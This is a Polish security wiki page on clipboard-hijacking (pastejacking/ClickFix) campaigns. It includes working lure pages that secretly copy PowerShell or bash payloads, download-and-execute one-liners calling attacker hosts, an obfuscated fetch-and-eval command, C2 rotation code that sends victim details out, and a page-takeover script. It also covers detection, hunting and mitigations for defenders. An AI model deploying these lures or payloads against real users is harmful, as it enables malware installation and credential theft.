# Ataki przechwytywania schowka (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Nigdy nie wklejaj niczego, czego nie skopiowałeś osobiście." – stare, ale wciąż trafne zalecenie

## Przegląd

Clipboard hijacking – znane też jako *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia bez sprawdzania ich. Złośliwa strona internetowa (lub dowolny kontekst obsługujący JavaScript, np. Electron lub aplikacja desktopowa) programowo umieszcza w systemowym schowku tekst kontrolowany przez atakującego. Ofiary są zachęcane, zwykle przez starannie przygotowane instrukcje socjotechniczne, do naciśnięcia **Win + R** (okno Uruchom), **Win + X** (Szybki dostęp / PowerShell), lub otwarcia terminala i *wklejenia* zawartości schowka, co powoduje natychmiastowe wykonanie dowolnych poleceń.

Ponieważ **żaden plik nie jest pobierany i żaden załącznik nie jest otwierany**, technika omija większość zabezpieczeń e-mail i treści sieciowych monitorujących załączniki, makra lub bezpośrednie wykonywanie poleceń. Atak jest zatem popularny w kampaniach phishingowych dostarczających powszechne rodziny malware, takie jak NetSupport RAT, Latrodectus loader czy Lumma Stealer.

## Forced copy buttons and hidden payloads (macOS one-liners)

Niektóre macOS infostealers klonują strony instalatorów (np. Homebrew) i **wymuszają użycie przycisku „Copy”**, tak że użytkownicy nie mogą zaznaczyć tylko widocznego tekstu. Zapis w schowku zawiera oczekiwane polecenie instalatora oraz dopisany ładunek Base64 (np. `...; echo <b64> | base64 -d | sh`), więc jedno wklejenie wykonuje oba kroki, podczas gdy UI ukrywa dodatkowy etap.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starsze kampanie używały `document.execCommand('copy')`, nowsze polegają na asynchronicznym **Clipboard API** (`navigator.clipboard.writeText`).

## Przebieg ClickFix / ClearFake

1. Użytkownik odwiedza typosquatted lub skompromitowaną stronę (np. `docusign.sa[.]com`)
2. Wstrzyknięty JavaScript **ClearFake** wywołuje pomocnika `unsecuredCopyToClipboard()`, który potajemnie zapisuje w schowku Base64-encoded PowerShell one-liner.
3. Instrukcje HTML mówią ofierze: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` uruchamia się, pobierając archiwum zawierające legalny plik wykonywalny oraz złośliwy DLL (klasyczny DLL sideloading).
5. Loader odszyfrowuje kolejne etapy, wstrzykuje shellcode i instaluje persistence (np. scheduled task) – ostatecznie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.

### Przykład łańcucha NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwy DLL dynamicznie rozwiązuje wywołania API za pomocą **GetProcAddress**, pobiera dwa binaria (`data_3.bin`, `data_4.bin`) za pomocą **curl.exe**, odszyfrowuje je przy użyciu rolling XOR key `"https://google.com/"`, wstrzykuje końcowy shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Pobiera `la.txt` za pomocą **curl.exe**
2. Uruchamia JScript downloader w **cscript.exe**
3. Pobiera MSI payload → zrzuca `libcef.dll` obok podpisanej aplikacji → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer przez MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Niektóre kampanie ClickFix pomijają całkowicie pobieranie plików i instruują ofiary, aby wkleiły one‑liner, który fetches and executes JavaScript via WSH, persists it, and rotates C2 daily. Przykładowy zaobserwowany łańcuch:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Kluczowe cechy
- Zamaskowany URL odwracany w czasie wykonywania, aby utrudnić powierzchowną inspekcję.
- JavaScript utrzymuje się poprzez Startup LNK (WScript/CScript) i wybiera C2 na podstawie bieżącego dnia – umożliwiając szybką domain rotation.

Minimalny fragment JS używany do rotacji C2s według daty:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Następny etap zazwyczaj wdraża loader, który ustanawia persistence i pobiera RAT (np. PureHVNC), często przypinając TLS do hardcoded certificate i dzieląc ruch na kawałki.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Codziennie rotujące nazwy hostów C2 i URL-e z patternem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korelacja zdarzeń zapisu do schowka, po których następuje wklejenie Win+R i natychmiastowe uruchomienie `powershell.exe`.

Zespoły Blue Team mogą łączyć telemetrykę schowka, tworzenia procesów i rejestru, aby zlokalizować nadużycia pastejackingu:

* Rejestr Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię poleceń **Win + R** – szukaj nietypowych wpisów Base64 / zniekształconych.
* Security Event ID **4688** (Process Creation) gdzie `ParentImage` == `explorer.exe` i `NewProcessName` w { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** dla tworzenia plików pod `%LocalAppData%\Microsoft\Windows\WinX\` lub w folderach tymczasowych tuż przed podejrzanym zdarzeniem 4688.
* EDR clipboard sensors (jeśli dostępne) – skoreluj `Clipboard Write` z natychmiastowym nowym procesem PowerShell.

## Strony w stylu IUAM (ClickFix Generator): kopiowanie ze schowka do konsoli + payloads dostosowane do OS

Ostatnie kampanie masowo produkują fałszywe strony weryfikacyjne CDN/browser ("Just a moment…", IUAM-style), które zmuszają użytkowników do skopiowania poleceń specyficznych dla OS z ich schowka do natywnych konsol. To przesuwa wykonanie poza sandbox przeglądarki i działa zarówno na Windows, jak i macOS.

Kluczowe cechy stron generowanych przez builder
- Wykrywanie OS za pomocą `navigator.userAgent`, aby dopasować payloads (Windows PowerShell/CMD vs. macOS Terminal). Opcjonalne decoy/no-op dla nieobsługiwanych OS, by utrzymać iluzję.
- Automatyczne kopiowanie do schowka przy nieszkodliwych akcjach UI (checkbox/Copy), podczas gdy widoczny tekst może różnić się od zawartości schowka.
- Blokowanie mobile i popover ze szczegółowymi instrukcjami krok po kroku: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opcjonalne obfuscation i single-file injector do nadpisania DOM skompromitowanej strony interfejsem w stylu Tailwind (nie wymaga rejestracji nowej domeny).

Przykład: niezgodność schowka + rozgałęzienie zależne od OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence podczas pierwszego uruchomienia
- Użyj `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` aby wykonanie kontynuowało się po zamknięciu terminala, zmniejszając widoczne artefakty.

In-place page takeover na skompromitowanych stronach
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Pomysły na wykrywanie i polowanie specyficzne dla wabików w stylu IUAM
- Web: Strony, które wiążą Clipboard API z widgetami weryfikacyjnymi; rozbieżność między wyświetlanym tekstem a payloadem schowka; `navigator.userAgent` branching; Tailwind + single-page replace w podejrzanych kontekstach.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` wkrótce po interakcji z przeglądarką; batch/MSI installers uruchamiane z `%TEMP%`.
- macOS endpoint: Terminal/iTerm uruchamiający `bash`/`curl`/`base64 -d` z `nohup` w pobliżu zdarzeń przeglądarki; zadania w tle przetrzymujące zamknięcie terminala.
- Koreluj historię `RunMRU` Win+R i zapisy do schowka z późniejszym tworzeniem procesów konsoli.

Zobacz także techniki wspomagające

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigacje

1. Wzmocnienie przeglądarki – wyłącz dostęp do zapisu schowka (`dom.events.asyncClipboard.clipboardItem` etc.) lub wymusz gest użytkownika.
2. Security awareness – ucz użytkowników, aby *wpisywali* wrażliwe polecenia lub najpierw wklejali je do edytora tekstu.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control w celu zablokowania dowolnych one-liners.
4. Kontrole sieciowe – blokuj outbound requests do znanych domen pastejacking i malware C2.

## Powiązane Tricks

* **Discord Invite Hijacking** często wykorzystuje tę samą metodę ClickFix po zwabieniu użytkowników na złośliwy serwer:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referencje

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
